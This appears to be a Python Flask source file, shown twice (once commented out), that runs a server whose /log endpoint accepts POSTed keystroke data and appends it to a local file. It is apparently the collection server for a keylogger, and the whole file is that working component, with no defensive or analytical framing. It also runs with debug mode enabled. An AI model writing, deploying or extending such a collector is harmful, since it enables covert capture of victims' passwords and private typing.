# from flask import Flask, request

# app = Flask(__name__)

# @app.route('/log', methods=['POST'])
# def log_keystrokes():
#     data = request.form.get('keystrokes')
#     if data:
#         with open('keystrokes.txt', 'a') as f:
#             f.write(data + '\n')
#         return 'Keystrokes logged successfully.\n'
#     else:
#         return 'No keystrokes received.\n'

# if __name__ == '__main__':
#     app.run(debug=True)

###############################################

from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_keystrokes():
    data = request.form.get('keystrokes')
    if data:
        with open('keystrokes.txt', 'a') as f:
            f.write(data + '\n')
        return 'Keystrokes logged successfully.\n'
    else:
        return 'No keystrokes received.\n'

@app.route('/', methods=['GET'])  # Handle GET requests to root endpoint
def ignore_get_requests():
    return 'This endpoint does not serve GET requests.\n', 405  # Return a 405 Method Not Allowed status code

if __name__ == '__main__':
    app.run(debug=True)
